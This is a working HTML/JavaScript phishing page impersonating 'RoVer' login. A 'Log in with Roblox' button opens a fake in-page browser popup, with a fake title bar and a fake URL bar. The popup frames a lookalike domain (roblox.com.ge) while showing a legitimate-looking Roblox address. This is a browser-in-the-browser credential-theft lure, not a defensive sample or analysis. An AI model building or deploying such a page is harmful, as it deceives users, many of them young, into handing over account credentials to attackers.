<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>RoVer – Login</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Roboto, sans-serif;
      background: #1d1b1b;
      color: white;
    }

    /* Button */
    .login-btn {
      background: #c91673;
      color: #fff;
      padding: 12px 22px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s ease;
      margin: 40px auto;
      display: block;
    }

    .login-btn:hover {
      background: #a1125f;
    }

    /* Fake popup window */
    .fake-popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 700px;
      height: 600px;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 0 30px rgba(0,0,0,0.8);
      overflow: hidden;
      z-index: 1000;
      border: 1px solid #ccc;
    }

    /* Fake browser top bar */
    .window-bar {
      background: #e0e0e0;
      height: 36px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 12px;
      font-size: 14px;
      font-weight: bold;
      color: #333;
      border-bottom: 1px solid #ccc;
    }

    .popup-close {
      font-size: 20px;
      cursor: pointer;
      color: #666;
    }

    .popup-close:hover {
      color: red;
    }

    /* Fake URL bar */
    .url-bar {
      background: #f4f4f4;
      border: 1px solid #ccc;
      margin: 10px;
      padding: 6px 10px;
      border-radius: 6px;
      font-size: 13px;
      font-family: monospace;
      color: #333;
      overflow: hidden;
      white-space: nowrap;
      text-overflow: ellipsis;
    }

    /* iFrame */
    .popup-iframe {
      width: 100%;
      height: calc(100% - 76px); /* 36px bar + 10px margin + 30px URL */
      border: none;
    }

    /* Background overlay */
    .overlay {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.65);
      z-index: 999;
    }
  </style>
</head>
<body>

  <!-- Trigger button -->
  <button class="login-btn" id="loginBtn">Log in with Roblox</button>

  <!-- Overlay background -->
  <div class="overlay" id="overlay"></div>

  <!-- Fake popup window -->
  <div class="fake-popup" id="fakePopup">
    <div class="window-bar">
      RoVer – Login
      <div class="popup-close" id="popupClose">&times;</div>
    </div>
    <div class="url-bar" id="urlDisplay">https://www.roblox.com/login</div>
    <iframe class="popup-iframe" id="popupIframe" src="https://www.roblox.com/login"></iframe>
  </div>

  <!-- Script -->
  <script>
    const loginBtn = document.getElementById("loginBtn");
    const fakePopup = document.getElementById("fakePopup");
    const popupClose = document.getElementById("popupClose");
    const overlay = document.getElementById("overlay");
    const iframe = document.getElementById("popupIframe");
    const urlDisplay = document.getElementById("urlDisplay");

    loginBtn.addEventListener("click", () => {
      // Optional: you can dynamically change the URL here
      const loginUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";
      iframe.src = loginUrl;
      urlDisplay.textContent = loginUrl;

      fakePopup.style.display = "block";
      overlay.style.display = "block";
    });

    popupClose.addEventListener("click", () => {
      fakePopup.style.display = "none";
      overlay.style.display = "none";
      iframe.src = ""; // optionally clear iframe
    });
  </script>

</body>
</html>
